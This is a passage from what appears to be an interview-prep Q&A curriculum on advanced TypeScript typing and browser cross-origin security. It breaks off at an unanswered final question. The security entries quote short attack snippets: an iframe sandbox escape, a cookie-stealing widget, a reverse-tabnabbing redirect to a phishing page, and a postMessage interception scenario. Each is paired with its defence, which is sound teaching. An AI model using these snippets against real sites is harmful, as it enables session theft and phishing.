difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Template literal types allow TypeScript to perform type-level string parsing and pattern matching. By combining template literal types with recursive conditional `infer`, you can parse express-style URL route paths (e.g. `"/users/:userId/posts/:postId"`) and extract a strongly-typed dictionary of URL route parameters.

```typescript
// 1. Recursive String Parser:
type ExtractRouteParams<T extends string> =
    T extends `${string}:${infer Param}/${infer Rest}`
    ? { [K in Param | keyof ExtractRouteParams<`/${Rest}`>]: string }
    : T extends `${string}:${infer Param}`
    ? { [K in Param]: string }
    : {};

// 2. Type-Safe Route Navigation Function:
function navigate<Path extends string>(
    path: Path,
    params: ExtractRouteParams<Path>
): string {
    let url: string = path;
    for (const [key, value] of Object.entries(params as Record<string, string>)) {
        url = url.replace(`:${key}`, value);
    }
    return url;
}

// USAGE VALIDATION:
// Valid: requires both userId and postId
const url = navigate('/users/:userId/posts/:postId', {
    userId: '101',
    postId: '884'
});

// Compile Error: missing postId property!
// navigate('/users/:userId/posts/:postId', { userId: '101' });
```

**How the recursion works:**
1. Matches `${string}:${infer Param}/${infer Rest}` -> extracts `userId`, recurses on `/posts/:postId`.
2. Matches trailing `${string}:${infer Param}` -> extracts `postId`.
3. Merges extracted keys into `{ userId: string; postId: string }`.

## Why

Template literal types parse URL paths at compile time, guaranteeing that route navigation calls provide all required parameters.

## Worked Case

Walkthrough scenario: A team maintains a web app with 80 routes. A developer updates a link to /organizations/:orgId/members/:memberId but forgets to provide memberId in the navigation parameters. Without type-safe route parsing, the app navigates to /organizations/123/members/:memberId, crashing the server with a 404. With ExtractRouteParams, the build immediately fails with Property memberId is missing in type { orgId: string }.

## Risk

Complex recursive string types can slow down TypeScript Language Server performance on huge routing files.

## Trade-off

Compile-time route extraction ensures path correctness without requiring external runtime regex engines.

## Try This

Pass a path without parameters (e.g. '/dashboard') to navigate and verify the params argument requires an empty object {}.

## Follow-ups

### How do you handle optional route parameters like :id?

Add a conditional branch checking if Param ends with '?' and remap to an optional property in the resulting type.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html

# How do variadic tuple types and tuple index manipulation enable type-safe curry and compose function signatures?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Variadic tuple types (introduced in TypeScript 4.0) allow spreading tuple types (`...T`) in arbitrary positions within array and tuple signatures. This enables full type-safety for higher-order functional programming idioms like `curry`, `concat`, and `compose`.

```typescript
// 1. Tuple concatenation and slicing:
type Concat<T extends readonly any[], U extends readonly any[]> = [...T, ...U];
type Combined = Concat<[number, string], [boolean]>; // [number, string, boolean]

// 2. Prepended and Appended Tuples:
type Push<T extends readonly any[], E> = [...T, E];
type Unshift<T extends readonly any[], E> = [E, ...T];

// 3. Type-Safe Function Currying for 2 arguments:
function curry2<A, B, R>(fn: (a: A, b: B) => R): (a: A) => (b: B) => R {
    return (a: A) => (b: B) => fn(a, b);
}

// 4. Arbitrary Variadic Pipe / Compose:
type Tail<T extends any[]> = T extends [any, ...infer Rest] ? Rest : [];
```

**Positional Soundness:**
Unlike legacy TypeScript where rest parameters had to be placed at the very end of a tuple, variadic tuples can be placed anywhere: `[string, ...number[], boolean]`. This accurately models functions that take leading options followed by variadic arguments and a trailing callback.

## Why

Variadic tuple types preserve element positions and lengths across functional transformations without type widening.

## Worked Case

Walkthrough scenario: A functional pipeline takes a database query builder and chains filter, sort, and paginate transformations. Without variadic tuples, chaining arguments widened positional tuples to Array<string | number>, losing parameter order and count. Variadic tuples preserve exact argument sequences and types across every piped function step.

## Risk

Deeply nested currying across unbounded variadic tuples can exceed TypeScript instantiation limits.

## Trade-off

Unlocks functional composition at the cost of sophisticated recursive type definitions.

## Try This

Write a typed concat<T extends any[], U extends any[]>(a: T, b: U): [...T, ...U] function and verify the returned tuple types.

## Follow-ups

### Can a tuple have two rest elements like [...T, ...U]?

A tuple can contain multiple rest spreads, but at most one spread may be of an unbounded array type like string[].

## Citations

- https://www.typescriptlang.org/docs/handbook/release-notes/typescript-4-0.html#variadic-tuple-types

# What are the exact differences between any, unknown, never, and void, and how does type algebra govern their intersections and unions?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `any`, `unknown`, `never`, and `void` occupy distinct mathematical positions in TypeScript's type hierarchy lattice:

- **`unknown` (Top Type):** Represents any value whatsoever. Type-safe: you *cannot* access properties or invoke methods on `unknown` without first narrowing it via `typeof`, `instanceof`, or a type guard.
- **`any` (Escape Hatch / Top & Bottom):** Disables type-checking entirely. You can access arbitrary properties, invoke it, and assign it to almost any type, spreading unsoundness throughout the codebase.
- **`never` (Bottom Type):** Represents the empty set of values. It is impossible to assign any value to `never`. Returned by functions that never return (throw or infinite loop) or unhandled variants in discriminated unions.
- **`void` (Unit-like Type):** Represents the absence of a meaningful return value. A function returning `void` may return `undefined` or return a value that callers must ignore.

```typescript
// Type Algebra Laws:

// 1. Unions (Sum Types):
type U1 = string | any;     // any (any absorbs everything in unions)
type U2 = string | unknown; // unknown (unknown absorbs everything except any)
type U3 = string | never;   // string (never is pruned from unions! Identity element)

// 2. Intersections (Product Types):
type I1 = string & any;     // any
type I2 = string & unknown; // string (unknown is identity element in intersections!)
type I3 = string & never;   // never (never absorbs everything in intersections!)
```

**Golden Rule:** Always prefer `unknown` over `any` for untrusted API responses, user inputs, and dynamic deserialization.

## Why

Understanding the type lattice ensures proper usage of top and bottom types for safe downcasting and exhaustive matching.

## Worked Case

Walkthrough scenario: An application parses JSON from an untrusted webhook. Typing the payload as any allows code like payload.user.preferences.theme to compile without error. If preferences is null at runtime, the node server crashes with an unhandled exception. Typing the payload as unknown forces the developer to validate required fields with runtime checks or Zod schemas before accessing properties.

## Risk

Using any silences compiler errors and disables type safety across all downstream variables that consume it.

## Trade-off

unknown requires explicit type narrowing before usage, adding validation code in exchange for absolute type soundness.

## Try This

Write a function accepting unknown and verify you cannot call .trim() without an if (typeof x === 'string') guard.

## Follow-ups

### Why does a callback returning void permit the implementation to return a boolean?

void in callback positions indicates the caller will ignore the return value, allowing array.forEach(x => set.add(x)) without compiler errors.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.typescriptlang.org/docs/handbook/2/types-from-types.html

# How does TypeScript execute excess property checks on fresh object literals, and why does intermediate variable assignment bypass them?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TypeScript's structural type system normally operates on **duck typing**: if an object has all required properties of a target type, it is assignable, even if it possesses additional properties. However, when an object is created as a **fresh object literal** directly at the assignment or argument site, TypeScript applies **Excess Property Checks** to prevent typos and invalid options.

```typescript
interface Options {
    color: string;
    width?: number;
}

function createBox(opts: Options) {}

// 1. Fresh Object Literal: Excess property check triggers immediately!
// createBox({ color: 'red', widht: 20 });
// Error: Object literal may only specify known properties, and 'widht' does not exist in type 'Options'. Did you mean 'width'?

// 2. Intermediate Variable Assignment: Bypasses excess property check!
const rawConfig = { color: 'red', widht: 20, extraSecret: 123 };
createBox(rawConfig); // Compiles without error!
// Why? rawConfig is not 'fresh'; structural subtyping applies because rawConfig has 'color: string'.
```

**Why Freshness matters:**
Passing `{ widht: 20 }` directly is almost always a human developer typo. But passing an existing `rawConfig` object is common when passing larger domain models to functions that only need a subset of their properties.

## Why

Excess property checks catch accidental typos and misspelled properties when passing inline object literals.

## Worked Case

Walkthrough scenario: A developer configures an HTTP client with interface RequestOptions { timeout?: number; headers?: Record<string, string> }. The developer writes fetchClient({ timout: 5000 }). Because this is an inline object literal, TypeScript immediately flags the typo 'timout'. Without excess property checks, 'timout' would be silently ignored, and the request would run with no timeout, causing production hangs.

## Risk

Assuming structural typing rejects extra properties everywhere: intermediate variables bypass excess property checks silently.

## Trade-off

Freshness checks break pure structural typing purity in exchange for practical typo prevention.

## Try This

Assign an object literal with an extra field directly to an interface versus assigning via a let variable to observe the check.

## Follow-ups

### How can an interface explicitly allow arbitrary extra properties?

Add an index signature: interface Options { color: string; [key: string]: any; } to permit unknown extra keys.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/objects.html#excess-property-checks

# How do you write ambient declaration files (.d.ts) to provide accurate types for untyped JavaScript libraries?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Ambient declaration files (`.d.ts`) describe the shape of existing JavaScript libraries to the TypeScript compiler without producing emitted JavaScript code. They use the `declare` keyword to assert the existence of variables, functions, classes, and modules provided by the external runtime environment.

```typescript
// Example: my-analytics-lib.d.ts

// 1. Declare external CommonJS / ESM Module:
declare module 'my-analytics-lib' {
    export interface AnalyticsConfig {
        apiKey: string;
        endpoint?: string;
        flushIntervalMs?: number;
    }

    export class AnalyticsTracker {
        constructor(config: AnalyticsConfig);
        track(event: string, properties?: Record<string, unknown>): void;
        identify(userId: string): Promise<boolean>;
        flush(): void;
    }

    // Default export:
    const defaultTracker: AnalyticsTracker;
    export default defaultTracker;
}

// 2. Typing static assets (e.g. SVG imports in bundlers):
declare module '*.svg' {
    const content: React.FC<React.SVGProps<SVGSVGElement>>;
    export default content;
}
```

**Crucial Syntax Guidelines:**
- Never include implementation bodies inside `.d.ts` files (use `;` instead of `{ ... }`).
- Declare types using `export` within `declare module` blocks.
- Include your `.d.ts` files in `tsconfig.json` `include` array so the compiler discovers them.

## Why

Ambient declaration files provide type contracts for untyped legacy npm packages and bundler asset imports.

## Worked Case

Walkthrough scenario: An application imports an in-house legacy analytics script that is loaded via a script tag onto window.Analytics. TypeScript throws Cannot find name Analytics. Creating an env.d.ts file with declare const Analytics: { logEvent: (name: string) => void }; informs the compiler of the global variable, providing autocompletion and eliminating build errors without modifying the legacy script.

## Risk

Writing ambient definitions that do not match the real JavaScript runtime exports leads to runtime undefined errors.

## Trade-off

Requires manual maintenance to keep ambient signatures synchronized with external library version updates.

## Try This

Create a declaration file for '*.png' and verify that importing a PNG image in TypeScript compiles without module not found errors.

## Follow-ups

### What is the difference between export = and export default in a declaration file?

export = models CommonJS module.exports = value, which callers consume via import x = require('x') or esModuleInterop import x from 'x'.

## Citations

- https://www.typescriptlang.org/docs/handbook/declaration-files/by-example.html

# What are the known soundness holes and intentional compromises in TypeScript's type system?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Unlike pure academic type systems (like Haskell or OCaml), TypeScript was explicitly designed with a pragmatic balance between safety and developer ergonomics. The official TypeScript Design Goals state: *'Produce a type system that is usable and idiomatic, not provably sound.'* There are four major intentional soundness compromises in TypeScript:

```typescript
// 1. Mutable Array Covariance (Classic Soundness Hole):
class Animal { name = 'animal'; }
class Dog extends Animal { bark() {} }
class Cat extends Animal { meow() {} }

let dogs: Dog[] = [new Dog()];
let animals: Animal[] = dogs; // Allowed because arrays are covariant!
animals.push(new Cat());     // Pushing a Cat into Animal[] modifies dogs underlying array!
dogs[1].bark();              // Crash at runtime! Cat does not have bark()!

// 2. Function Parameter Bivariance on Methods:
interface Consumer {
    consume(a: Dog): void;
}
// Method syntax allows assigning (a: Animal) => void or (a: Dog) => void bidirectionally.

// 3. Array Index Undefined Holes (without noUncheckedIndexedAccess):
const empty: number[] = [];
const num = empty[0]; // Type is 'number', but runtime value is 'undefined'!

// 4. Type Assertions (as) and 'any':
const x = 'hello' as unknown as number; // Bypasses type checker completely.
```

**Mitigations:**
Enable strict compiler flags (`--strict`, `--noUncheckedIndexedAccess`, `--strictFunctionTypes`) and use `readonly` arrays (`ReadonlyArray<T>`) to prevent mutable covariant array writes.

## Why

Understanding intentional soundness compromises allows engineers to identify and guard against edge cases where the compiler cannot protect them.

## Worked Case

Walkthrough scenario: A developer has a function modifyList(items: BaseItem[]) that adds a default BaseItem to the list. The caller passes a SpecializedItem[] array. Because TypeScript arrays are covariant, the code compiles cleanly. At runtime, the caller iterates over SpecializedItem[] and calls item.specialMethod(), which crashes with a TypeError on the newly added BaseItem. Refactoring modifyList to accept readonly BaseItem[] prevents the mutation at compile time.

## Risk

Assuming TypeScript guarantees 100 percent runtime correctness: type assertions and covariant arrays can still throw TypeError at runtime.

## Trade-off

Pragmatic unsoundness enables seamless interop with dynamic JavaScript idioms without excessive type casting ceremonies.

## Try This

Push a superclass instance into a subclass array via a covariant reference and observe the runtime method failure.

## Follow-ups

### How does ReadonlyArray prevent the covariant array mutation soundness hole?

ReadonlyArray removes push, pop, and index assignment methods, preventing callers from inserting incompatible subtypes.

## Citations

- https://www.typescriptlang.org/docs/handbook/type-compatibility.html
- https://github.com/Microsoft/TypeScript/wiki/TypeScript-Design-Goals

# How do function overloads differ from generic conditional types, and when is each pattern superior for API design?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Both function overloads and generic conditional types allow a function to return different types depending on its input arguments. However, they differ radically in signature visibility, union argument handling, and implementation complexity.

```typescript
// APPROACH 1: Function Overloads
function getItem(id: number): string;
function getItem(ids: number[]): string[];
// Implementation signature (hidden from callers!):
function getItem(arg: number | number[]): string | string[] {
    return Array.isArray(arg) ? arg.map(String) : String(arg);
}

const s = getItem(1);    // string
const arr = getItem([1]); // string[]
// Overload Pitfall: Passing a union parameter FAILS!
// const unionArg: number | number[] = 1 as any;
// getItem(unionArg); // Error! Neither overload matches number | number[]!

// APPROACH 2: Generic Conditional Types
type ItemResult<T extends number | number[]> = T extends number[] ? string[] : string;
function getItemGeneric<T extends number | number[]>(arg: T): ItemResult<T> {
    return (Array.isArray(arg) ? arg.map(String) : String(arg)) as ItemResult<T>;
}
// Generic Handles Unions Gracefully:
// getItemGeneric(unionArg) returns string | string[] automatically!
```

**Selection Heuristics:**
- **Use Function Overloads** when argument types and return types vary across completely different positional arguments or different arities (e.g. `createElement(tag)` vs `createElement(tag, props, ...children)`).
- **Use Generic Conditional Types** when the return type is a direct mathematical projection of a single input argument, especially when callers frequently pass union types.

## Why

Choosing between overloads and conditional types determines whether an API can handle union arguments and multi-arity parameters cleanly.

## Worked Case

Walkthrough scenario: A database query helper has overloads query(sql: string): SingleRow and query(sql: string[]): BatchRow[]. A caller writes a wrapper function that passes sql: string | string[]. Calling query(sql) triggers an error: No overload matches this call. Refactoring the function to a generic conditional type query<T extends string | string[]>(sql: T): T extends string[] ? BatchRow[] : SingleRow allows the function to accept both individual inputs and union inputs seamlessly.

## Risk

Function overloads reject union arguments because TypeScript evaluates overloads sequentially and matches only exact individual signatures.

## Trade-off

Overloads provide distinct JSDoc documentation per signature; conditional types handle unions seamlessly with single signatures.

## Try This

Call an overloaded function with a union type argument (string | number) and observe why TypeScript requires a union overload or generic conditional.

## Follow-ups

### Why is the implementation signature of an overloaded function not visible to outside callers?

TypeScript treats the implementation signature solely as an internal contract to satisfy all declared overload signatures.

## Citations

- https://www.typescriptlang.org/docs/handbook/2/functions.html#function-overloads
- https://www.typescriptlang.org/docs/handbook/2/conditional-types.html

# How does window.postMessage enable safe cross-origin communication, and what security checks are mandatory?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The browser's Same-Origin Policy (SOP) strictly prevents scripts on one origin from accessing DOM or JavaScript objects on a different origin. `window.postMessage` is the official, secure API designed to bridge this boundary between windows, tabs, popups, and iframes. Safe communication requires enforcing two non-negotiable security checks:
1. **Sender Security (`targetOrigin`):** The sending window must specify an explicit, authoritative target origin (e.g. `'https://trusted-partner.com'`). Never use `'*'` when transmitting sensitive tokens or private user data, as any malicious site could embed the iframe or open a popup and intercept the message.
2. **Receiver Security (`event.origin`):** The receiving window's message listener must immediately inspect `event.origin` against an allowlist before reading `event.data`. Failing to validate `event.origin` allows any arbitrary malicious website on the internet to send fake payloads.

```typescript
// 1. SENDER: Embedded Iframe transmitting payload to Parent Window
const parentWindow = window.parent;
const targetOrigin = 'https://app.enterprise.com'; // NEVER use '*'
parentWindow.postMessage({ type: 'CHECKOUT_COMPLETE', orderId: 'ord_99' }, targetOrigin);

// 2. RECEIVER: Parent Window validating incoming message
window.addEventListener('message', (event: MessageEvent) => {
    // MANDATORY CHECK 1: Strict Origin Verification
    if (event.origin !== 'https://checkout.enterprise.com') {
        console.warn('Rejected untrusted postMessage from origin:', event.origin);
        return;
    }

    // MANDATORY CHECK 2: Validate Data Structure and Type
    const data = event.data;
    if (!data || typeof data !== 'object') return;

    if (data.type === 'CHECKOUT_COMPLETE') {
        console.log('Order verified:', data.orderId);
    }
});
```

**Complexity analysis and mechanics:**
- **Structured Clone Algorithm:** `postMessage` serializes payloads using the structured clone algorithm (cloning Maps, Sets, Dates, ArrayBuffers), not plain JSON stringification.
- **Asynchronous dispatch:** Messages are queued on the recipient window's event loop task queue, executing non-blockingly.

**Algorithmic mechanics and edge cases:**
If `targetOrigin` does not match the actual current origin of the target window (e.g., if the user navigated to a different page), the browser silently discards the message without delivering it or raising an error, ensuring data never leaks to unexpected domains.

## Why

Strict targetOrigin and event.origin checks prevent cross-origin eavesdropping and malicious message injection.

## Worked Case

Walkthrough scenario: A fintech payment iframe passes a credit card token back to the parent merchant checkout page. The developer writes window.parent.postMessage({ token }, '*'). An attacker embeds the payment iframe inside attacker.com. When the user clicks pay, postMessage broadcasts to attacker.com, and the attacker's window.onmessage steals the credit card token. Fixing targetOrigin to 'https://merchant.com' causes the browser to block transmission to attacker.com, thwarting the attack.

## Risk

Using targetOrigin='*' allows any malicious site embedding your frame to intercept sensitive user tokens and private data.

## Trade-off

Requires maintaining synchronized domain allowlists across environments (development, staging, production).

## Try This

Send a postMessage with targetOrigin set to wrong domain and observe the browser silently preventing delivery in DevTools.

## Follow-ups

### Can functions or DOM elements be sent across postMessage?

No, the Structured Clone Algorithm cannot clone functions, DOM nodes, or symbols; attempting to do so throws a DataCloneError DOMException.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
- https://owasp.org/www-community/attacks/Cross-Site_Scripting_(XSS)_via_postMessage

# What does the iframe sandbox attribute do, and why is combining allow-scripts with allow-same-origin dangerous?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The `sandbox` attribute on an `<iframe>` enables an extra set of strict security restrictions for embedded content. When used with an empty value (`<iframe sandbox src="...">`), it applies maximum lockdown: scripts cannot execute, forms cannot submit, popups cannot open, plugins are disabled, and the embedded frame is treated as having a unique, opaque origin (`null`). Capabilities can be selectively granted using flags (e.g. `allow-scripts`, `allow-forms`).

Crucially, **combining `allow-scripts` with `allow-same-origin` on untrusted content completely destroys the sandbox**: Because `allow-same-origin` grants the iframe its actual origin and `allow-scripts` allows JavaScript execution, a script inside the iframe can simply execute `window.parent.document.querySelector('iframe').removeAttribute('sandbox')`, permanently escaping the sandbox!

```html
<!-- 1. MAXIMUM LOCKDOWN: Scripts, forms, and popups blocked -->
<iframe sandbox src="https://untrusted.com/widget.html"></iframe>

<!-- 2. SAFE SANDBOX FOR THIRD-PARTY SCRIPTS: Scripts allowed, but origin remains 'null' -->
<iframe sandbox="allow-scripts" src="https://untrusted.com/widget.html"></iframe>

<!-- 3. CRITICAL VULNERABILITY: Sandboxing completely defeated! -->
<iframe sandbox="allow-scripts allow-same-origin" src="https://untrusted.com/widget.html"></iframe>
```

**Complexity analysis and mechanics:**
- **Origin coercion:** Without `allow-same-origin`, the iframe's origin is forced to `null`, blocking access to `localStorage`, cookies, and same-origin DOM.
- **Common flags:** `allow-forms` (form submission), `allow-popups` (window.open), `allow-top-navigation` (navigating parent browser tab).

**Algorithmic mechanics and edge cases:**
To safely host user-uploaded untrusted HTML (like previewing markdown or customer emails), serve the content from an entirely isolated secondary domain (e.g., `usercontent.example.com` rather than `app.example.com`) in addition to using `sandbox="allow-scripts"`.

## Why

Iframe sandboxing isolates untrusted third-party code from accessing parent cookies, storage, and DOM trees.

## Worked Case

Walkthrough scenario: A SaaS app allows users to embed custom JavaScript widgets. The app uses sandbox='allow-scripts allow-same-origin'. An attacker crafts a widget containing window.parent.document.cookie. Because allow-same-origin is present, the iframe shares the parent origin, and allow-scripts executes the payload, extracting the parent's session tokens. Removing allow-same-origin forces the iframe into origin null, blocking access to parent DOM and cookies.

## Risk

Combining allow-scripts and allow-same-origin permits embedded malicious scripts to programmatically remove their own sandbox.

## Trade-off

Strict sandboxing prevents untrusted widgets from accessing cookies or storage, requiring postMessage for state exchange.

## Try This

Attempt to access window.localStorage inside an iframe with sandbox='allow-scripts' and verify SecurityError is thrown.

## Follow-ups

### What does the allow-top-navigation-by-user-activation sandbox flag enforce?

It permits the iframe to navigate the top-level parent window only if the navigation is triggered by a direct user gesture (like a click), blocking automatic programmatic redirects.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox
- https://web.dev/articles/sandboxed-iframes

# How does the BroadcastChannel API coordinate state across multiple browser tabs, and how does it compare to storage events?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The `BroadcastChannel` API provides a simple 1-to-many publish/subscribe communication channel between different browser contexts (windows, tabs, iframes, and Web Workers) that share the **exact same origin**. Unlike `window.postMessage` (which requires a direct reference to the target window), any context can create a `new BroadcastChannel('channel_name')` and broadcast messages that all other open tabs listening to the same channel receive immediately.

```typescript
// Cross-Tab Session Synchronization:
export const authChannel = new BroadcastChannel('auth_sync_channel');

// 1. In Tab A: User logs out -> Broadcast to all other open tabs
export function logoutUser() {
    localStorage.removeItem('authToken');
    authChannel.postMessage({ type: 'LOGOUT', timestamp: Date.now() });
    window.location.href = '/login';
}

// 2. In Tab B, Tab C, Tab D: Listen for broadcast events
authChannel.onmessage = (event: MessageEvent) => {
    if (event.data?.type === 'LOGOUT') {
        console.warn('Logout broadcast received from another tab. Redirecting...');
        window.location.href = '/login';
    }
};

// Cleanup when component unmounts or worker closes:
// authChannel.close();
```

**Complexity analysis and mechanics:**
- **Zero serialization overhead:** Messages use structured cloning rather than string serialization, supporting complex objects.
- **Comparison to StorageEvent:** The legacy `window.onstorage` trick required writing dummy keys to `localStorage` (which blocks the main thread with synchronous disk I/O and has a 5MB cap). `BroadcastChannel` is purely in-memory and non-blocking.

**Algorithmic mechanics and edge cases:**
A BroadcastChannel does *not* deliver messages back to the sending context that called `postMessage()`—only other peer tabs receive it. BroadcastChannel works seamlessly inside Web Workers and Service Workers, enabling background synchronization across tabs.

## Why

BroadcastChannel provides clean, in-memory cross-tab communication without abuse of synchronous localStorage disk writes.

## Worked Case

Walkthrough scenario: A user opens an online banking app across 3 tabs. In Tab 1, the user clicks 'Log Out'. Tab 1 broadcasts { type: 'LOGOUT' } on authChannel. Tabs 2 and 3 receive the event within 2ms, invalidate their local memory caches, and redirect to the login screen, preventing unauthorized actions on stale open tabs.

## Risk

Forgetting to call channel.close() when components or workers unmount leaks memory and keeps background event listeners active.

## Trade-off

Only functions between windows sharing the exact same origin; cannot communicate across different domains.

## Try This

Open two tabs of the same app, postMessage on BroadcastChannel in Tab 1, and observe instant console log in Tab 2.

## Follow-ups

### Does BroadcastChannel work across different origins (e.g. app.com and api.com)?

No, BroadcastChannel strictly enforces the Same-Origin Policy; communication is isolated exclusively to contexts sharing identical protocol, host, and port.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/BroadcastChannel
- https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API

# How do you use a SharedWorker to share a single WebSocket connection across multiple open browser tabs?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** When users open 10 tabs of an enterprise application (e.g. Slack, trading dashboards, Google Docs), having each tab open its own dedicated WebSocket connection multiplies backend server load tenfold and wastes device memory and battery. A `SharedWorker` is a singleton background script that runs independently in the browser and can be connected to by multiple tabs, iframes, or windows from the same origin. The SharedWorker maintains **one persistent WebSocket connection** to the backend, broadcasting incoming messages to all connected ports and multiplexing outgoing messages from all tabs.

```typescript
// shared-worker.ts (Background singleton process)
const connections = new Set<MessagePort>();
const ws = new WebSocket('wss://api.enterprise.com/realtime');

ws.onmessage = (event) => {
    // Broadcast server message to all connected tabs:
    connections.forEach(port => port.postMessage(JSON.parse(event.data)));
};

(self as any).onconnect = (e: MessageEvent) => {
    const port = e.ports[0];
    connections.add(port);
    port.start();

    port.onmessage = (msgEvent) => {
        // Forward message from any tab to the single WebSocket:
        ws.send(JSON.stringify(msgEvent.data));
    };
};

// tab-client.ts (Inside each browser tab)
const worker = new SharedWorker(new URL('./shared-worker.ts', import.meta.url));
worker.port.start();
worker.port.onmessage = (event) => {
    console.log('Received real-time message via SharedWorker:', event.data);
};
worker.port.postMessage({ action: 'SUBSCRIBE', channel: 'trades' });
```

**Complexity analysis and mechanics:**
- **Connection efficiency:** Exactly 1 socket connection per client machine regardless of open tab count ($O(1)$ connections).
- **MessagePort lifecycle:** Each tab communicates with the SharedWorker via an entangled `MessagePort` pair.

**Algorithmic mechanics and edge cases:**
When all tabs closing the SharedWorker are closed, the browser automatically terminates the SharedWorker and its WebSocket. Note that Safari historically had incomplete SharedWorker support; production architectures typically check `typeof SharedWorker !== 'undefined'` and fall back to tab-local WebSockets when unsupported.

## Why

SharedWorkers eliminate redundant WebSocket connections across tabs, reducing server connection exhaustion by 90%.

## Worked Case

Walkthrough scenario: An exchange trading platform has 100,000 active users who average 5 open tabs each. Direct WebSockets require 500,000 persistent socket connections on backend servers. Implementing SharedWorker drops total backend connections from 500,000 down to 100,000, slashing infrastructure server costs by 80% while keeping all tabs in perfect sync.

## Risk

Debugging SharedWorkers requires navigating to chrome://inspect/#workers; standard tab DevTools do not log worker console output.

## Trade-off

Significantly higher architectural complexity; requires MessagePort communication and fallback for unsupported browsers.

## Try This

Open chrome://inspect/#workers in Google Chrome while running a SharedWorker script and inspect its dedicated console.

## Follow-ups

### What happens to a SharedWorker when the last open tab using it is closed?

The browser automatically closes the worker's ports and terminates the SharedWorker process to free system memory.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/SharedWorker
- https://developer.mozilla.org/en-US/docs/Web/API/MessagePort

# Why is window.opener a severe security liability (reverse tabnabbing), and how does rel="noopener noreferrer" prevent it?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** When an HTML link includes `target="_blank"` without protection, the newly opened tab receives a JavaScript reference to the originating window via `window.opener`. This creates a severe security vulnerability known as **Reverse Tabnabbing**: the newly opened external website can execute `window.opener.location = 'https://phishing-site.com'` in the background while the user is looking at the new tab. When the user switches back to their original tab, they see a convincing fake login page asking for their credentials.

```html
<!-- VULNERABLE: New window can manipulate opener window location! -->
<a href="https://untrusted-external.com" target="_blank">Visit Partner</a>

<!-- SAFE: Completely severs window.opener reference -->
<a href="https://untrusted-external.com" target="_blank" rel="noopener noreferrer">
    Visit Partner
</a>
```

```typescript
// Programmatic window.open() safety:
const newWindow = window.open('https://external.com', '_blank', 'noopener,noreferrer');
// If noopener is omitted:
if (newWindow) newWindow.opener = null; // Immediately sever opener reference!
```

**Complexity analysis and mechanics:**
- **`rel="noopener"`:** Instructs the browser to set `window.opener` to `null` in the new browsing context and runs the new window in an isolated process thread.
- **`rel="noreferrer"`:** Additionally strips the HTTP `Referer` request header, preventing the destination website from learning the URL of the originating page.

**Algorithmic mechanics and edge cases:**
Modern browsers (Chrome 88+, Firefox 79+, Safari 12.1+) now default `target="_blank"` on `<a>` tags to `rel="noopener"` automatically. However, programmatic `window.open(url, '_blank')` calls still leak `window.opener` unless `'noopener'` is explicitly passed in window features!

## Why

Severing window.opener prevents untrusted external links from redirecting the user's active session to phishing pages.

## Worked Case

Walkthrough scenario: A developer creates a link to an external blog: <a href="..." target="_blank">. The external blog gets hacked. The hacker's page executes window.opener.location = 'https://fake-login-prompt.com'. The user closes the blog and sees the login prompt on the original tab, enters their password, and gets compromised. Adding rel="noopener noreferrer" sets window.opener to null, preventing the external page from touching the parent tab.

## Risk

Calling window.open() programmatically without noopener leaves the parent application vulnerable to reverse tabnabbing.

## Trade-off

Setting window.opener = null prevents legitimate popups (like OAuth dialogs) from signaling back to the parent without postMessage.

## Try This

Open a target='_blank' link without noopener to a page with window.opener.location='https://example.com' and observe parent redirect.

## Follow-ups

### Does modern Chrome default target='_blank' to noopener automatically?

Yes, Chrome 88+ defaults anchor tags with target='_blank' to rel='noopener', but programmatic window.open() calls still require explicit noopener.

## Citations

- https://owasp.org/www-community/attacks/Reverse_Tabnabbing
- https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener

# How do you design a bi-directional RPC message-passing protocol over postMessage with request-response correlation?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

